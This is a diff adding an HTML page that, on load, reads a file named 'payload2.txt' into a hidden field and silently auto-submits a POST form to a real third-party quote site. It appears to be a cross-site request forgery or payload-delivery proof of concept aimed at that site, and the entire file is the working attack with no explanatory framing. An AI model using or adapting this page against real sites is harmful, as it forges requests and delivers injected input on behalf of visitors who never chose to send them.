@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>POST Request Auto-Redirect</title>
+</head>
+
+<body>
+    <form id="autoPostForm" action="https://preventivi.senec.it/global/" method="POST">
+        <input type="hidden" name="step" value='1'>
+        <input type="hidden" name="address" id="addressInput">
+    </form>
+
+    <script>
+        // Load the address from a file and then submit the form
+        fetch('payload2.txt')
+            .then(response => response.text())
+            .then(address => {
+                document.getElementById('addressInput').value = address;
+                document.getElementById('autoPostForm').submit();
+            })
+            .catch(error => {
+                console.error('Error loading address:', error);
+            });
+    </script>
+</body>
+
+</html>
